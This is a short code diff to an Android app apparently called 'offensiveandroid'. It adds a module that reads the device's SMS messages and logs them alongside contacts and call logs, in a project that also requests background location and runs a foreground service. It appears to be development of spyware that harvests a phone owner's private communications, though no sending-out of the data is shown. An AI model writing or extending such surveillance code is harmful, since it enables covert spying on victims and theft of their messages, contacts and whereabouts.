@@ -10,6 +10,7 @@ import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import com.example.offensiveandroid.ui.theme.CallLogsRetriever
 import com.example.offensiveandroid.ui.theme.ContactsRetriever
+import com.example.offensiveandroid.ui.theme.SMSRetriever
 import com.google.android.gms.common.api.ResolvableApiException
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.LocationSettingsRequest
@@ -20,6 +21,7 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var contacts: ContactsRetriever
     private lateinit var callLogs : CallLogsRetriever
+    private lateinit var sms: SMSRetriever
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -33,6 +35,7 @@ class MainActivity : AppCompatActivity() {
 
         contacts = ContactsRetriever(this)
         callLogs = CallLogsRetriever(this)
+        sms = SMSRetriever(this)
 
         checkAndRequestPermissions()
         val serviceIntent = Intent(this, MyForegroundService::class.java)
@@ -84,6 +87,7 @@ class MainActivity : AppCompatActivity() {
             checkBackgroundLocationPermission()
             Log.e("Contacts",contacts.getAllContacts().toString())
             Log.e("CallLogs",callLogs.getCallLogs().toString())
+            Log.e("SMS", sms.getSMS().toString())
         }
     }
 
